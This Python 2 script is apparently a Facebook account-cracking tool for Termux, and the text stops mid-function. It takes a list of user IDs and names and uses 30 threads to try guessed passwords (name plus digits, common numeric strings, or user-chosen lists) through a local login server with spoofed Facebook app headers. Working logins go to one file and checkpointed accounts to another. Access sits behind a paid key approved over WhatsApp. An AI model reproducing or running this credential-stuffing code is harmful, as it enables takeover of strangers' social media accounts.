#!/usr/bin/python
# -*- coding: utf-8
try:
    import os, sys, time, datetime, re, random, hashlib, threading, json, getpass, urllib, cookielib, requests, uuid
    from multiprocessing.pool import ThreadPool
except ImportError:
    os.system('pip2 install requests')
    os.system('pip2 install mechanize')

os.system('clear')
if not os.path.isfile('/data/data/com.termux/files/usr/bin/node'):
    os.system('apt update && apt install nodejs -y')
if not os.path.isfile('/data/data/com.termux/files/usr/bin/ruby'):
    os.system('apt install ruby -y && gem install lolcat')
from requests.exceptions import ConnectionError

os.system('termux-setup-storage')
try:
    os.mkdir('/sdcard/ids')
except OSError:
    pass

bd = random.randint(20000000.0, 30000000.0)
sim = random.randint(20000.0, 40000.0)
bd=random.randint(2e7, 3e7)
sim=random.randint(2e4, 4e4)
header={'x-fb-connection-bandwidth': repr(bd),'x-fb-sim-hni': repr(sim),'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA','user-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36','content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}
header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 
   'x-fb-net-hni': repr(sim), 
   'x-fb-connection-quality': 'EXCELLENT', 
   'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
   'user-agent': 'Mozilla/5.0 (Linux; Android 5.1; HUAWEI LUA-U22) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36;]', 
   'user-agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]',
   'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Chrome/79.0.3945.116) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.116 Mobile Safari/537.36;]', 
   'user-agent': 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16;]', 
   'user-agent': 'Mozilla/5.0 (Windows NT 6.3; ARM; Trident/7.1; Touch; rv:11.2; WPDesktop; Lumia 730 Dual SIM) like Gecko;]', 
   'user-agent': 'Mozilla/5.0 (Windows NT 10.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36;]', 
   'user-agent': 'Mozilla/5.0 (Linux; Android 7.0.1; SM-J500M Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/122.0.0.10.69;]', 
   'user-agent': 'Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; Microsoft; RM-1068) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537;]', 
   'user-agent': 'Mozilla/5.0 (Linux; Android 5.0; Moto G (5) Build/NPPS25.137-33-6; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/122.0.0.10.69;]', 
   'user-agent': 'Mozilla/5.0 (Linux; Android 4.4.4; SM-T116BU Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Safari/537.36 [FB_IAB/MESSENGER;FBAV/123.0.0.11.70;]', 
   'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 7_3_2 like Mac OS X) AppleWebKit/603.2.4 (KHTML, like Gecko) Mobile/14F89 [FBAN/FBIOS;FBAV/98.0.0.48.70;FBBV/62465497;FBDV/iPhone6,1;FBMD/iPhone;FBSN/iOS;FBSV/10.3.2;FBSS/2;FBCR/VIVO;FBID/phone;FBLC/pt_BR;FBOP/5;FB;]', 
   'user-agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36;]', 
   'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36;]', 
   'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36;]', 
   'user-agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36;]', 
   'content-type': 'application/x-www-form-urlencoded', 
   'x-fb-http-engine': 'Liger'}
reload(sys)
sys.setdefaultencoding("utf-8")
c = "\033[1;32m"
c2 = "\033[0;97m"
c3 = "\033[1;31m"
os.system('git pull')
os.system('clear')
#My Logo
logo = """
\033[1;92m                      :::!~!!!!!:.
\033[1;93m                  .xUHWH!! !!?M88WHX:.
\033[1;94m                .X*#M@$!!  !X!M$$$$$$WWx:.
\033[1;95m               :!!!!!!?H! :!$!$$$$$$$$$$8X:
\033[1;96m             !!~  ~:~!! :~!$!#$$$$$$$$$$8X:
\033[1;97m             :!~::!H!<   ~.U$X!?R$$$$$$$$MM! 
\033[1;96m             ~!~!!!!~~ .:XW$$$U!!?$$$$$$RMM! 
\033[1;95m               !:~~~ .:!M"T#$$$$WX??#MRRMMM! 
\033[1;94m               ~?WuxiW*`   `"#$$$$8!!!!??!!! 
\033[1;93m             :X- M$$$$   \033[1;91m✘   \033[1;92m`"#$$$$8!!!!??!
\033[1;92m            :%`  ~#$$$m:        ~!~ ?$$$$$$
\033[1;97m          :!`.-   ~T$$$$8xx.  .xWW- ~""##*" 
\033[1;92m.....   -~~:<` !    ~?T#$$@@W@*?$$  \033[1;91m✘\033[1;92m   /`
\033[1;93mW$@@M!!! .!~~ !!     .:XUW$W!~ `"~:    :
\033[1;94m#"~~`.:x%`!!  !H:   !WM$$$$Ti.: .!WUn+!`
\033[1;95m:::~:!!`:X~ .: ?H.!u "$$$B$$$!W:U!T$$M~
\033[1;96m.~~   :X@!.-~   ?@WTWo("*$$$W$TH$! `
\033[1;97mWi.~!X$?!-~    : ?$$$B$Wu("**$RM!
\033[1;96m$R@i.~~ !     :   ~$$$$$B$$en:``     
\033[1;95m?MXT@Wx.~    :     ~"##*$$$$M~ 
\033[1;93m⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌
\033[1;92m        乃ﾚﾑᄃズ\033[1;96mｲﾉム乇尺-\033[1;94m乇尺尺の尺\033[1;95mկօկ
\033[1;93m⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌"""
print("")
def reg():
    os.system('clear')
    print logo
    print("")
    print"""  \033[1;92m╔═━───────────────━━━───────────────────━═╗"""
    print '\x1b[1;37m      Tool Approval For Login Charges 350'
    print"""  \033[1;92m╚═━───────────────━━━───────────────────━═╝"""
    print ''
    time.sleep(3)
    try:
        to = open('/sdcard/L.txt', 'r').read()
    except (KeyError, IOError):
        reg2()

    r = requests.get('https://raw.githubusercontent.com/BatMan-Error404/kk4/main/L.txt').text
    if to in r:
        os.system('cd Tiger && npm install')
        os.system('fuser -k 5000/tcp &')
        os.system('#')
        os.system('cd Tiger && node index.js &')
        time.sleep(10)
        log_menu()
    else:
        os.system('clear')
        print logo
        print("")
        print("\t\033[1;36m╔═━┳✪✪╤────────━━━────────✪✪━═╗\033[0;97m")
        print '\t        Approved Failed'
        print("\t\033[1;36m╚═━┻✪✪╧────────━━━────────✪✪━═╝\033[0;97m")
        print("")
        print ' \x1b[1;92mYour Key Is Not Approved  '
        print ' \x1b[1;92mCopy The Key And Send To Admin'
        print("")
        print ' \x1b[1;35mYour Key\033[1;33m: ' + to
        print("")
        raw_input('\x1b[1;96m          Press Enter To Send Key')
        os.system('xdg-open https://wa.me/+923037335114')
        reg()


def reg2():
    os.system('clear')
    print logo
    print("")
    print("\t\033[1;36m╔═━┳✪✪╤────────━━━────────✪✪━═╗\033[0;97m")
    print '\t      Key Approved Chek '
    print("\t\033[1;36m╚═━┻✪✪╧────────━━━────────✪✪━═╝\033[0;97m")
    print("")
    print ' \x1b[1;92mCopy The Key And Send To Admin'
    print("")
    id = uuid.uuid4().hex[:50]
    print ' Your id: ' + id
    print ''
    sav = open('/sdcard/L.txt', 'w')
    sav.write(id)
    sav.close()
    raw_input(' Press Enter And Go To Whatsapp ')
    os.system('xdg-open https://wa.me/+923037335114')
    print ''
    raw_input('\x1b[1;92m      Press Enter To Check Approval ')
    reg()


def log_menu():
    try:
        t_check = open('access_token.txt', 'r')
        menu()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print("")
        print  """\033[1;36m    ╔═━───────────────━━━──────────────━═╗"""
        print("\t  \033[1;37m╔═━────────━━━────────━═╗\033[0;97m")
        print("\033[1;92m             [A] FB__Token__Login")
        print("\t  \033[1;37m╚═━────────━━━────────━═╝\033[0;97m")
        print  """\033[1;36m    ╚═━───────────────━━━──────────────━═╝"""
        os.system('echo -e "-----------------------------------------------"| lolcat')
        print("\033[1;37m         [\033[1;41mᗷEᔕT ᗰETᕼOᗪ [ᗩ] TOKEᑎ ᒪOGIᑎ\033[0;97m]")
        os.system('echo -e "-----------------------------------------------"| lolcat')
        print  """\033[1;92m╔═━┳✪✪╤───────────────────────────────────✪✪━═╗"""
        os.system('echo -e "        Note: Only File Cloning ADD Enjoy "| lolcat')
        print  """\033[1;92m╚═━┻✪✪╧───────────────────────────────────✪✪━═╝"""
        print("")
        
        log_menu_s()


def log_menu_s():
    s = raw_input("\x1b[1;33m ▄▄︻̷̿┻̿═══━一        ")
    if s == 'A':
    	log_token()
    else:
        print ''
        print ' Wrong Choice Bro '
        print ''
        log_menu_s()

def log_token():
    os.system('clear')
    print logo
    print("")
    print("\t  \033[1;37m╔═━────────━━━────────━═╗\033[0;97m")
    print("\t   \033[1;36m    FB TOKEᑎ ᒪOGIᑎ \033[0;97m")
    print("\t  \033[1;37m╚═━────────━━━────────━═╝\033[0;97m")
    print("")
    print """ \033[1;31mPest\033[1;32mToken\033[1;33mHere"""
    
    
    tok = raw_input("\033[1;36m▄▄︻デ═══━一 \033[1;37m: ")
    print 47 * '-'
    t_s = open('access_token.txt', 'w')
    t_s.write(tok)
    t_s.close()
    menu()

def menu():
    os.system('clear')
    try:
        token = open('access_token.txt', 'r').read()
    except (KeyError, IOError):
        print ''
        print logo
        print '\x1b[1;31;1mLogin FB Token'
        time.sleep(1)
        log_menu()

    try:
        r = requests.get('https://graph.facebook.com/me?access_token=' + token)
        q = json.loads(r.text)
        z = q['name']
    except (KeyError, IOError):
        print logo
        print ''
        print("\t\033[1;32m╔═━┳✪✪╤────────━━━────────✪✪━═╗\033[0;97m")
        print '\t       Ohh No Token Expire\x1b[0;97m'
        print("\t\033[1;32m╚═━┻✪✪╧────────━━━────────✪✪━═╝\033[0;97m")
        print ''
        os.system('rm -rf access_token.txt')
        time.sleep(3)
        log_menu()
    except requests.exceptions.ConnectionError:
        print logo
        print ''
        print '\t Turn on mobile data/wifi\x1b[0;97m'
        print ''
        raw_input(' \x1b[1;92mPress enter after turning on mobile data/wifi ')
        menu()

    os.system('clear')
    print logo
    tok = open('/data/data/com.termux/binyaminkimaankichut.txt', 'r').read()
    print("")
    print("\033[1;37m     ╔═━──────────────━━━──────────────━═╗\033[0;97m")
    print '  \x1b[1;92m    Your Login ID Name 👉 \x1b[1;92m' + z
    print("\033[1;37m     ╚═━──────────────━━━──────────────━═╝\033[0;97m")
    print("")
    print  """\033[1;92m╔═━┳✪✪╤──────────────────────────────────✪✪━═╗"""
    print'\x1b[1;96m    Key \x1b[1;93m' + tok
    print  """\033[1;92m╚═━┻✪✪╧──────────────────────────────────✪✪━═╝"""
    print("")
    print  """\033[1;92m╔═━┳✪✪╤────────────────────────────────✪✪━═╗"""
    print ("\x1b[1;91m[A] Crack With Auto PSS")
    print ("\x1b[1;92m[B] Your Choice Digits PSS")
    print ("\x1b[1;93m[C] Your Choice Name + Digits PSS")
    print ("\x1b[1;95m[D] Your Choice Name PSS")
    print ("\x1b[1;96m[E] Tool Creat \x1b[1;31m(Public/\x1b[1;33mID Dump)")
    print ("\x1b[1;96m[F] Tool Creat \x1b[1;31m(Followers/\x1b[1;33mID Dump)")
    print  """\033[1;92m╚═━┻✪✪╧────────────────────────────────✪✪━═╝"""
    menu_s()


def menu_s():
    ms = raw_input("\033[1;36m▄▄︻デ═══━一 \033[1;37m: ")
    if ms == 'A':
        auto_crack()
    elif ms == 'B':
        choice_crack()
    elif ms == 'C':
        name_crack()
    elif ms == 'D':
        digit_crack()
    elif ms == 'E':
        ex_id()
    elif ms == 'F':
    	ex_Fi()
    else:
        print ''
        print '\tWrong Choice Bro'
        print ''
        menu_s()


def auto_crack():
    global token
    try:
        token = open('access_token.txt', 'r').read()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print '\t Login FB Token\x1b[0;97m'
        print ''
        time.sleep(1)
        log_menu()

    os.system('clear')
    print logo
    print("")
    print """\033[1;97m-----------------------------------------------"""
    print """\033[1;97m  [\033[1;41m BlackFaster Tool Your Choice (Auto Pass) \033[1;0m]""" 
    print """\033[1;97m-----------------------------------------------"""
    print("")
    print"""╔═━───────────━━━───────────━═╗"""
    print '\x1b[1;93m[A] Faster Tool File cloning'
    print '\x1b[1;95m[B] Back\033[1;0m'
    print"""╚═━───────────━━━───────────━═╝"""
    a_s()
    
def a_s():
    id = []
    cps = []
    oks = []
    a_s = raw_input("\033[1;37m▄▄︻デ═══━一 \033[1;37m: ")
    if a_s == 'A':
        os.system('clear')
        print logo
        print("")
        print """\033[1;97m-----------------------------------------------"""
        print """\033[1;97m [\033[1;41m BlackFaster Tool Your Choice (Auto Pass) \033[1;0m]""" 
        print """\033[1;97m-----------------------------------------------"""
        print("")
        try:
            idlist = raw_input(' \x1b[1;92mYour File Path/Name: \x1b[0;97m ')
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print 'Select Your Right Path/File Not Found.'
            raw_input('\x1b[1;92mPress Enter To Back. ')
            auto_crack()
    elif a_s == 'B':
        menu()
    else:
        print("")
        print("\t "+c+"Your Choice is Wrong(Try Again) "+c2)
        print("")
        auto_crack()
    print ' \x1b[1;92mCollecting Total ids: \x1b[1;92m ' + str(len(id))
    time.sleep(0.5)
    print ' \x1b[1;97mBlackFaster Tool is Ready\x1b[1;91m '
    print("")
    os.system('echo -e "\t ცՆค८қ_Բคς੮૯Ր████▒▒100%  " | lolcat')
    time.sleep(0.5)
    print("")
    print """\033[1;97m-----------------------------------------------"""
    print """\033[1;97m    [\033[1;41m Tool Create  By BlackTiger-Error404\033[1;0m]""" 
    print """\033[1;97m-----------------------------------------------"""

    def main(arg):
        user = arg
        uid, name = user.split('|')
        try:
            pass1 = name.lower() + '12345'
            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers=header).text
            q = json.loads(data)
            if 'loc' in q:
                print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass1
                cp = open('JUTT_CP.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                pass2 = name.lower() + '1234'
                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers=header).text
                q = json.loads(data)
                if 'loc' in q:
                    print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass2
                    cp = open('JUTT_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                else:
                    pass3 = name.lower() + '786'
                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers=header).text
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass3
                        cp = open('JUTT_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                    else:
                        pass4 = name.lower() + '123'
                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers=header).text
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass4
                            cp = open('JUTT_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.apppend(uid + pass4)
                        else:
                            pass5 = '234567'
                            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass5, headers=header).text
                            q = json.loads(data)
                            if 'loc' in q:
                                print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'www.facebook.com' in q['error']:
                                print '\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass5
                                cp = open('JUTT_CP.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                cps.apppend(uid + pass5)
                            else:
                                pass6 = '223344'
                                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass6, headers=header).text
                                q = json.loads(data)
                                if 'loc' in q:
                                    print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass6 + '\x1b[0;97m'
                                    ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'www.facebook.com' in q['error']:
                                    print '\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass6
                                    cp = open('JUTT_CP.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
                                    cps.apppend(uid + pass6)
                                else:
                                    pass7 = '334455'
                                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass7, headers=header).text
                                    q = json.loads(data)
                                    if 'loc' in q:
                                        print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass7 + '\x1b[0;97m'
                                        ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                                        ok.write(uid + ' | ' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid + pass7)
                                    elif 'www.facebook.com' in q['error']:
                                        print '\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass7
                                        cp = open('JUTT_CP.txt', 'a')
                                        cp.write(uid + ' | ' + pass7 + '\n')
                                        cp.close()
                                        cps.apppend(uid + pass7)
                                    else:
                                        pass8 = '445566'
                                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass8, headers=header).text
                                        q = json.loads(data)
                                        if 'loc' in q:
                                            print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass8 + '\x1b[0;97m'
                                            ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                                            ok.write(uid + ' | ' + pass8 + '\n')
                                            ok.close()
                                            oks.append(uid + pass8)
                                        elif 'www.facebook.com' in q['error']:
                                            print '\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass8
                                            cp = open('JUTT_CP.txt', 'a')
                                            cp.write(uid + ' | ' + pass8 + '\n')
                                            cp.close()
                                            cps.apppend(uid + pass8)
                                        else:
                                            pass9 = '556677'
                                            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass9, headers=header).text
                                            q = json.loads(data)
                                            if 'loc' in q:
                                                print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass9 + '\x1b[0;97m'
                                                ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                                                ok.write(uid + ' | ' + pass9 + '\n')
                                                ok.close()
                                                oks.append(uid + pass9)
                                            elif 'www.facebook.com' in q['error']:
                                                print '\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass9
                                                cp = open('JUTT_CP.txt', 'a')
                                                cp.write(uid + ' | ' + pass9 + '\n')
                                                cp.close()
                                                cps.apppend(uid + pass9)
                                            else:
                                                pass10 = '667788'
                                                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass10, headers=header).text
                                                q = json.loads(data)
                                                if 'loc' in q:
                                                    print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass10 + '\x1b[0;97m'
                                                    ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                                                    ok.write(uid + ' | ' + pass10 + '\n')
                                                    ok.close()
                                                    oks.append(uid + pass10)
                                                elif 'www.facebook.com' in q['error']:
                                                    print '\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass10
                                                    cp = open('JUTT_CP.txt', 'a')
                                                    cp.write(uid + ' | ' + pass10 + '\n')
                                                    cp.close()
                                                    cps.apppend(uid + pass10)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print 47 * '-'
    print ' \x1b[1;92mCrack Done'
    print ' \x1b[1;92mTotal Ok/Cp:' + str(len(oks)) + '/' + str(len(cps))
    print 47 * '-'
    raw_input(' \x1b[1;93mPress enter to back')
    menu()


def choice_crack():
    global token
    try:
        token = open('access_token.txt', 'r').read()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print '\x1b[1;97mTool Use Login FB Token To Continue'
        time.sleep(1)
        log_menu()

    os.system('clear')
    print logo
    print("")
    print """\033[1;97m-----------------------------------------------"""
    print """\033[1;97m[\033[1;41m Faster Tool Your Choice (Word/Digits (Pass)\033[1;0m]""" 
    print """\033[1;97m-----------------------------------------------"""
    print("")
    print"""╔═━───────────━━━───────────━═╗"""
    print '\x1b[1;92m[A] Faster Tool File cloning'
    print '\x1b[1;94m[B] Back\033[1;0m'
    print"""╚═━───────────━━━───────────━═╝"""
    c_s()


def c_s():
    id = []
    cps = []
    oks = []
    c_s = raw_input("\033[1;33m▄▄︻̷̿┻̿══━一  ")
    if c_s == 'A':
        os.system('clear')
        print logo
        print """\033[1;97m-----------------------------------------------"""
        print """\033[1;97m[\033[1;41m Faster Tool Your Choice (Word/Digits (Pass)\033[1;0m]""" 
        print """\033[1;97m-----------------------------------------------"""
        print("")
        print """\033[1;97m-----------------------------------------------"""
        print '\x1b[1;93mPass_For Example:223344-334455-445566-789789'
        print '\x1b[1;93mPass_For Example:786786-000786-78600-123456'
        print '\x1b[1;93mPass_For Example:Pakistan-pakistan-Lahore'
        print """\033[1;97m-----------------------------------------------"""
        print("")
        pass1 = raw_input(' \x1b[1;31m[1]ANY PASS      \033[1;37m✪✪➛➢  ')
        pass2 = raw_input(' \x1b[1;32m[2]ANY PASS      \033[1;36m✪✪➛➢  ')
        pass3 = raw_input(' \x1b[1;33m[3]ANY PASS      \033[1;35m✪✪➛➢  ')
        pass4 = raw_input(' \x1b[1;34m[4]ANY PASS      \033[1;33m✪✪➛➢  ')
        pass5 = raw_input(' \x1b[1;35m[5]ANY PASS      \033[1;34m✪✪➛➢  ')
        pass6 = raw_input(' \x1b[1;36m[6]ANY PASS      \033[1;31m✪✪➛➢  ')
        pass7 = raw_input(' \x1b[1;37m[7]ANY PASS      \033[1;32m✪✪➛➢  ')
        pass8 = raw_input(' \x1b[1;31m[8]ANY PASS      \033[1;33m✪✪➛➢  ')
        pass9 = raw_input(' \x1b[1;32m[9]ANY PASS      \033[1;34m✪✪➛➢  ')
        pass10 = raw_input(' 10]ANY PASS      \033[1;37m✪✪➛➢  ')
        try:
            idlist = raw_input(' \x1b[1;92mYour File Path/Name: \x1b[0;97m ')
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print 'Select Your Right Path/File Not Found.'
            raw_input('\x1b[1;92mPress Enter To Back. ')
            choice_crack()

    elif c_s == 'B':
        menu()
    else:
        print("")
        print("\t "+c+"Your Choice is Wrong(Try Again) "+c2)
        print("")
        choice_crack()
    print ' \x1b[1;92mCollecting Total ids: \x1b[1;92m ' + str(len(id))
    time.sleep(0.5)
    print ' \x1b[1;97mBlackFaster Tool is Ready\x1b[1;91m '
    print("")
    os.system('echo -e "\t ცՆค८қ_Բคς੮૯Ր████▒▒100%  " | lolcat')
    time.sleep(0.5)
    print("")
    print """\033[1;97m-----------------------------------------------"""
    print """\033[1;97m    [\033[1;41m Tool Create  By BlackTiger-Error404\033[1;0m]""" 
    print """\033[1;97m-----------------------------------------------"""

    def main(arg):
        user = arg
        uid, name = user.split('|')
        try:
            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers=header).text
            q = json.loads(data)
            if 'loc' in q:
                print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass1
                cp = open('JUTT_CP.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers=header).text
                q = json.loads(data)
                if 'loc' in q:
                    print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass2
                    cp = open('JUTT_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                else:
                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers=header).text
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass3
                        cp = open('JUTT_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                    else:
                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers=header).text
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass4
                            cp = open('JUTT_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.apppend(uid + pass4)
                        else:
                            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass5, headers=header).text
                            q = json.loads(data)
                            if 'loc' in q:
                                print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'www.facebook.com' in q['error']:
